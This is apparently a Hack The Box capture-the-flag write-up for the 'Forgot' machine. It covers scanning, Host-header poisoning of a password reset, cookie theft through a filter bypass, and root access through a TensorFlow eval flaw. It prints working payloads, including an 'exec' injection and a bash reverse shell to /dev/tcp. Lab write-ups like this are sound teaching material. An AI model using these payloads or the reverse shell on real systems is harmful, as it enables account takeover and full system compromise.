#### Scanning
we start with nmap scan, which discovered 2 open  ports 22 and 80
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    Werkzeug/2.1.2 Python/3.8.10
|_http-title: 429 Too Many Requests
|_http-server-header: Werkzeug/2.1.2 Python/3.8.10
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 14 Nov 2022 04:45:01 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     X-Varnish: 8
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 14 Nov 2022 04:44:50 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 219
|     Location: http://127.0.0.1
|     X-Varnish: 3
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="http://127.0.0.1">http://127.0.0.1</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.1.2 Python/3.8.10
|     Date: Mon, 14 Nov 2022 04:44:52 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Content-Length: 0
|     X-Varnish: 32772
|     Age: 0
|     Via: 1.1 varnish (Varnish/6.2)
|     Accept-Ranges: bytes
|     Connection: close
|   RTSPRequest, SIPOptions: 
|_    HTTP/1.1 400 Bad Request
```

During hiden directory scanning found 2 login pages and password reset page.
```
┌──(kali㉿kali)-[~/workspace/HTB/machine/forgot]
└─$ feroxbuster -u http://forgot.htb/ -w ~/workspace/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt  

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://forgot.htb/
 🚀  Threads               │ 50
 📖  Wordlist              │ /home/kali/workspace/tools/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        5l       22w      221c http://forgot.htb/login => http://forgot.htb
302      GET        5l       22w      221c http://forgot.htb/home => http://forgot.htb
401      GET        1l        2w       19c http://forgot.htb/tickets
200      GET      253l      498w     5227c http://forgot.htb/forgot
200      GET      261l      517w     5523c http://forgot.htb/reset
```
in which `forgot` and `tickets` is a login page and `reset` is  a password reset form.

From source code we find a username `robert-dev-1450222`. we tried host header poisioning in `/reset` page and found a vaild token 
```┌──(kali㉿kali)-[~/workspace/HTB/machine/forgot]
└─$ nc -nvlp 6565
listening on [any] 6565 ...
connect to [10.10.16.2] from (UNKNOWN) [10.129.72.49] 57426
GET /reset?token=lpHFT2RstJuJSM1EKSfEPsZrASQLQlzt/QNtGC8Zyn4/C0j7Qdcu5ePW/akU/k2mhB/5bsG6dxnlrt5UekzUHA== HTTP/1.1
Host: 10.10.16.2:6565
User-Agent: python-requests/2.22.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

for successfull login url encode the token.
url looks like `http://machineip/reset?token=BW04FF6SO9v9ohCGOXDhf18gF%2BYVV%2BC85Q594FSq6Kqbvohr1WcJW%2B1jIiISGlsx6cX7jaaIuY0IcS2QXOFjJg%3D%3D`
follow to the link and set new password. login via username `robert-dev-1450222` and newly set password.
`admin password cannot be reset` 
while chehcking through the source code we find another endpoint named `admin_tickets` which is acces denied

```<div class="header-2">

            <div id="menu-bar" class="fas fa-bars"></div>

            <nav class="navbar">
                <a href="[/home](view-source:http://10.129.73.194/home)">home</a>
                <a href="[/tickets](view-source:http://10.129.73.194/tickets)">tickets</a>
                <a href="[/escalate](view-source:http://10.129.73.194/escalate)">escalate</a>
                <a href="[/admin_tickets](view-source:http://10.129.73.194/admin_tickets)" class="disabled">tickets(escalated)</a>
            </nav>
            <div class="icons" style="font-size:15px;">
                Logged in as Robert
            </div>
```

`/esclate` we can submit some issues regarding the box so we utilized thoses page to do our next step.

![](/Hack-The-Box/forgot/img/1.png)

In the link box when we tried the payload `http://ourip` we got a flagged error message

![](/Hack-The-Box/forgot/img/2.png)

so trieng to bypass that we changed the schema grom `http` to `HTtp` , which successfully bypassed the flagging

![](/Hack-The-Box/forgot/img/3.png)
Now we need to check for callback for that setup a python server and send the request
```┌──(kali㉿kali)-[~/workspace/HTB/machine/forgot]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.188 - - [17/Nov/2022 09:55:56] "GET / HTTP/1.1" 200 -
10.10.11.188 - - [17/Nov/2022 09:55:57] "GET / HTTP/1.1" 200 -
10.10.11.188 - - [17/Nov/2022 09:55:57] "GET / HTTP/1.1" 200 -
```
now we got the callback.

Now we need to check the callback headers for checking their is any session cookies. FOr that we setup a netcat listner on port 80 and wait for that call back...

![](/Hack-The-Box/forgot/img/4.png)

successfully we got cookie...

Now we capture  `/admin_tickets` request and using burp repeater we changed the seesion cookie and check the response,we will get the credentials of diego user.

we logged in as diego and found that diego user can run  the following command.

```
-bash-5.0$ sudo -l
Matching Defaults entries for diego on forgot:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```


```
#!/usr/bin/python3
import sys
import csv
import pickle
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

# Create a function to convert an array of strings to a set of features
def getVec(text):
    features = []
    for i, line in enumerate(text):
        test_data = word_tokenize(line.lower())
        v1 = model.infer_vector(test_data)
        featureVec = v1
        lineDecode = unquote(line)
        lowerStr = str(lineDecode).lower()
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
        feature1 += int(lowerStr.count('form'))
        feature1 += int(lowerStr.count('embed'))
        feature1 += int(lowerStr.count('ilayer'))
        feature1 += int(lowerStr.count('layer'))
        feature1 += int(lowerStr.count('style'))
        feature1 += int(lowerStr.count('applet'))
        feature1 += int(lowerStr.count('meta'))
        feature1 += int(lowerStr.count('img'))
        feature1 += int(lowerStr.count('iframe'))
        feature1 += int(lowerStr.count('marquee'))
        # add feature for malicious method count
        feature2 = int(lowerStr.count('exec'))
        feature2 += int(lowerStr.count('fromcharcode'))
        feature2 += int(lowerStr.count('eval'))
        feature2 += int(lowerStr.count('alert'))
        feature2 += int(lowerStr.count('getelementsbytagname'))
        feature2 += int(lowerStr.count('write'))
        feature2 += int(lowerStr.count('unescape'))
        feature2 += int(lowerStr.count('escape'))
        feature2 += int(lowerStr.count('prompt'))
        feature2 += int(lowerStr.count('onload'))
        feature2 += int(lowerStr.count('onclick'))
        feature2 += int(lowerStr.count('onerror'))
        feature2 += int(lowerStr.count('onpage'))
        feature2 += int(lowerStr.count('confirm'))
        # add feature for ".js" count
        feature3 = int(lowerStr.count('.js'))
        # add feature for "javascript" count
        feature4 = int(lowerStr.count('javascript'))
        # add feature for length of the string
        feature5 = int(len(lowerStr))
        # add feature for "<script"  count
        feature6 = int(lowerStr.count('script'))
        feature6 += int(lowerStr.count('<script'))
        feature6 += int(lowerStr.count('&lt;script'))
        feature6 += int(lowerStr.count('%3cscript'))
        feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
        # add feature for special character count
        feature7 = int(lowerStr.count('&'))
        feature7 += int(lowerStr.count('<'))
        feature7 += int(lowerStr.count('>'))
        feature7 += int(lowerStr.count('"'))
        feature7 += int(lowerStr.count('\''))
        feature7 += int(lowerStr.count('/'))
        feature7 += int(lowerStr.count('%'))
        feature7 += int(lowerStr.count('*'))
        feature7 += int(lowerStr.count(';'))
        feature7 += int(lowerStr.count('+'))
        feature7 += int(lowerStr.count('='))
        feature7 += int(lowerStr.count('%3C'))
        # add feature for http count
        feature8 = int(lowerStr.count('http'))
        
        # append the features
        featureVec = np.append(featureVec,feature1)
        featureVec = np.append(featureVec,feature2)
        featureVec = np.append(featureVec,feature3)
        featureVec = np.append(featureVec,feature4)
        featureVec = np.append(featureVec,feature5)
        featureVec = np.append(featureVec,feature6)
        featureVec = np.append(featureVec,feature7)
        featureVec = np.append(featureVec,feature8)
        features.append(featureVec)
    return features


# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
conn.close()
data=[]
for i in r:
        data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

# show the sample inputs and predicted outputs
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass

for i in range(len(Xnew)):
     t = threading.Thread(target=assessData, args=(i,))
#     t.daemon = True
     t.start()

```


while reading the script we found the vulnerabile object
`from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string` 

We found a vulnerable cve that could by-stand our findings `https://github.com/advisories/GHSA-75c9-jrh4-79mc`

###Proof of concept

`hello=exec("""\nimport os\nos.system("id > /tmp/id.txt")""")` use the script in `/esclate`  and run the command
`sudo ./ml_security.py`

```
diego@forgot:/tmp$ cat id.txt 
uid=0(root) gid=0(root) groups=0(root)
```

For getting shell access:

Create a file named `shell.sh` in `/tmp` directory with the following script and change its execute permission.

```
#!/bin/bash
bash -i >&  /dev/tcp/ip/port 0>&1
```

Set up a netcat listening and `hello=exec("""\nimport os\nos.system("bash /tmp/shell.sh")""")`  use the script in `/esclate` .

```
listening on [any] 7878 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.188] 51156
root@forgot:/opt/security# 
```
